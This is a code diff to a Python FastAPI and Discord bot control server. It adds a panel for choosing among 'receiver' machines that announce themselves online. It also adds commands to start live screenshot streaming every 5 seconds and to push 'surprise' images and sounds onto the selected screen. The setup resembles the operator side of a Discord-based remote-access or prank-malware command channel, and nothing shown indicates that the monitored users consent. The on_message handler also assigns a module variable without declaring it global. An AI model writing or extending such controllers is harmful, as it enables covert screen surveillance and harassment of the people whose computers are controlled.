@@ -46,6 +46,8 @@ assert TARGET_CHANNEL_ID
 
 ROOT_DIR = Path(__file__).parent
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
+_receivers: set[str] = set()
+_selected_receiver: Optional[str] = None
 
 # ---------------- DISCORD ----------------
 intents = discord.Intents.default()
@@ -74,6 +76,15 @@ async def on_message(message: discord.Message):
                 _latest_screenshot["message_id"] = str(message.id)
                 _latest_screenshot["ts"] = str(message.created_at)
                 break
+    # Track receiver announcements
+    if message.channel.id == COMMAND_CHANNEL_ID and message.content.startswith(f"{BOT_TAG} ONLINE"):
+        parts = message.content.split(maxsplit=2)
+        if len(parts) >= 3:
+            tag = parts[2].strip()
+            if tag:
+                _receivers.add(tag)
+                if _selected_receiver is None:
+                    _selected_receiver = tag
 # ---------------- WEBSOCKET HUB ----------------
 class Hub:
     def __init__(self):
@@ -140,13 +151,48 @@ CONTROL_HTML = """<!doctype html>
     </div>
   </div>
   <div class="card">
+    <h1>Select Receiver</h1>
+    <div id="receiver-buttons" class="row" style="flex-wrap: wrap;"></div>
+  </div>
+  <div class="card">
     <h1>Live Screen (5s)</h1>
     <p style="margin: 4px 0 12px; color:#cbd5e1;">Latest screenshot posted by receiver every 5 seconds.</p>
     <div id="screen-wrap">
       <img id="screen-img" src="" alt="Waiting for screenshot..." />
     </div>
+    <div class="row" style="margin-top:10px;">
+      <form method="post" action="/ui/live/start">
+        <button type="submit">Start Live</button>
+      </form>
+      <form method="post" action="/ui/live/stop">
+        <button class="secondary" type="submit">Stop Live</button>
+      </form>
+    </div>
   </div>
   <script>
+    async function refreshReceivers() {
+      try {
+        const res = await fetch('/api/receivers');
+        if (!res.ok) return;
+        const data = await res.json();
+        const wrap = document.getElementById('receiver-buttons');
+        wrap.innerHTML = '';
+        (data.receivers || []).forEach(tag => {
+          const form = document.createElement('form');
+          form.method = 'post';
+          form.action = '/ui/select/' + encodeURIComponent(tag);
+          const btn = document.createElement('button');
+          btn.type = 'submit';
+          btn.textContent = tag;
+          if (data.selected === tag) {
+            btn.style.background = '#10b981';
+            btn.style.color = '#0b1224';
+          }
+          form.appendChild(btn);
+          wrap.appendChild(form);
+        });
+      } catch (e) { /* ignore */ }
+    }
     async function refreshScreen() {
       try {
         const res = await fetch('/api/screenshot');
@@ -158,7 +204,9 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
+    refreshReceivers();
     refreshScreen();
+    setInterval(refreshReceivers, 5000);
     setInterval(refreshScreen, 4000);
   </script>
 </body>
@@ -205,19 +253,28 @@ async def _send_cmd_with_files(msg: str, file_paths: list[Path]):
         return
     await ch.send(content=msg, files=files)
 
+def _cmd_with_selection(cmd: str) -> str:
+    if _selected_receiver:
+        return f"{BOT_TAG} {cmd} {_selected_receiver}"
+    return f"{BOT_TAG} {cmd}"
+
 @app.post("/cmd/gif/start")
 async def gif_start():
-    await _send_cmd(f"{BOT_TAG} DISPLAY_GIF_START")
+    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_START"))
     return JSONResponse({"ok": True})
 
 @app.post("/cmd/gif/stop")
 async def gif_stop():
-    await _send_cmd(f"{BOT_TAG} DISPLAY_GIF_STOP")
+    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_STOP"))
     return JSONResponse({"ok": True})
 
 @app.get("/api/screenshot")
 async def api_screenshot():
     return JSONResponse(_latest_screenshot)
+
+@app.get("/api/receivers")
+async def api_receivers():
+    return JSONResponse({"receivers": sorted(_receivers), "selected": _selected_receiver})
 
 @app.post("/ui/surprise")
 async def ui_surprise():
@@ -234,12 +291,29 @@ async def ui_surprise():
     if not files:
         return HTMLResponse("Missing suprise.png/surprise.png and sound.mp3 next to main.py", status_code=400)
 
-    await _send_cmd_with_files(f"{BOT_TAG} DISPLAY_GIF_START", files)
+    await _send_cmd_with_files(_cmd_with_selection("DISPLAY_GIF_START"), files)
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/gif/stop")
 async def ui_gif_stop():
     await gif_stop()
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/live/start")
+async def ui_live_start():
+    await _send_cmd(_cmd_with_selection("LIVE_START"))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/live/stop")
+async def ui_live_stop():
+    await _send_cmd(_cmd_with_selection("LIVE_STOP"))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/select/{tag}")
+async def ui_select(tag: str):
+    global _selected_receiver
+    if tag in _receivers:
+        _selected_receiver = tag
     return RedirectResponse(url="/", status_code=303)
 
 # ---------------- STARTUP ----------------
